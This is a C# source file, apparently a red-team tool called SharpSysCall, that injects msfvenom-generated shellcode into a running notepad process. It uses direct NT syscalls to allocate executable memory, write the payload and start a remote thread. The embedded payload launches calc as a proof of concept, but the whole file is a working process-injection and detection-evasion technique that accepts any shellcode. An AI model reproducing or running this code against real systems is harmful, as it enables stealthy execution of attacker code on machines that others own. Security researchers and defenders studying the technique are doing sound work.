using System;
using System.Diagnostics;

using static SharpSysCall.Win32;
using static SharpSysCall.Syscall;

namespace SharpSysCall {
	class Program {
		static void Main(string[] args) {

			Console.WriteLine("SharpSyscall Injection");

			Process[] npProc = Process.GetProcessesByName("notepad");
			int pid = npProc[0].Id;

			//msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -f base64
			byte[] buf = Convert.FromBase64String("/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=");

			IntPtr addr = IntPtr.Zero;
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
			UInt32 allocationSize = (uint)buf.Length;
			UInt32 outSize = 0;
			IntPtr threadHandle = new IntPtr();

			NtAllocateVirtualMemory(hProcess, ref addr, 0, ref allocationSize, 0x00002000 | 0x00001000, 0x40);
			NtWriteVirtualMemory(hProcess, addr, buf, (uint)buf.Length, ref outSize);
			NtCreateThreadEx( ref threadHandle, 0x0000FFFF | 0x001F0000, IntPtr.Zero, hProcess, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

		}
	}
}
